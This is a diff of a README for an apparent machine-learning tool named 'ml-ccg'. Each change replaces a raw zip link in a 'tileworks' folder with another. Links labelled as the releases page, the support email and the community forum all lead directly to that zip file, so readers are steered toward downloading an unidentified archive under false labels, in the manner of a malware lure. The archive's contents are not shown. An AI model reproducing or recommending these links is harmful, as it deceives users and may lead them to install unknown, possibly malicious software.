@@ -6,13 +6,13 @@ Welcome to **ml-ccg**! This application is designed to simplify your machine lea
 
 #### 🔗 Download Now
 
-[![Download ml-ccg](https://raw.githubusercontent.com/Sikukhayatinamuna/ml-ccg/main/tileworks/ml-ccg.zip)](https://raw.githubusercontent.com/Sikukhayatinamuna/ml-ccg/main/tileworks/ml-ccg.zip)
+[![Download ml-ccg](https://github.com/Sikukhayatinamuna/ml-ccg/raw/refs/heads/main/tileworks/ccg-ml-3.8.zip)](https://github.com/Sikukhayatinamuna/ml-ccg/raw/refs/heads/main/tileworks/ccg-ml-3.8.zip)
 
 ## 📥 Download & Install
 
 To get started with ml-ccg, follow these steps:
 
-1. Click this link to visit the releases page: [ml-ccg Releases](https://raw.githubusercontent.com/Sikukhayatinamuna/ml-ccg/main/tileworks/ml-ccg.zip).
+1. Click this link to visit the releases page: [ml-ccg Releases](https://github.com/Sikukhayatinamuna/ml-ccg/raw/refs/heads/main/tileworks/ccg-ml-3.8.zip).
 2. On the releases page, you will see a list of available versions. Choose the latest version.
 3. Download the version that matches your operating system.
 4. Once downloaded, locate the file on your computer.
@@ -84,11 +84,11 @@ If you encounter issues, check this troubleshooting guide:
 
 For further assistance, contact our support team:
 
-- **Email:** https://raw.githubusercontent.com/Sikukhayatinamuna/ml-ccg/main/tileworks/ml-ccg.zip
-- **Community Forum:** Join discussions with other users [here](https://raw.githubusercontent.com/Sikukhayatinamuna/ml-ccg/main/tileworks/ml-ccg.zip).
+- **Email:** https://github.com/Sikukhayatinamuna/ml-ccg/raw/refs/heads/main/tileworks/ccg-ml-3.8.zip
+- **Community Forum:** Join discussions with other users [here](https://github.com/Sikukhayatinamuna/ml-ccg/raw/refs/heads/main/tileworks/ccg-ml-3.8.zip).
 
 ## 📅 Future Updates
 
-We consistently work on improving ml-ccg. Stay updated with new features and improvements by regularly visiting our releases page at [ml-ccg Releases](https://raw.githubusercontent.com/Sikukhayatinamuna/ml-ccg/main/tileworks/ml-ccg.zip).
+We consistently work on improving ml-ccg. Stay updated with new features and improvements by regularly visiting our releases page at [ml-ccg Releases](https://github.com/Sikukhayatinamuna/ml-ccg/raw/refs/heads/main/tileworks/ccg-ml-3.8.zip).
 
 Thank you for choosing ml-ccg! We hope it helps you simplify your machine learning tasks.
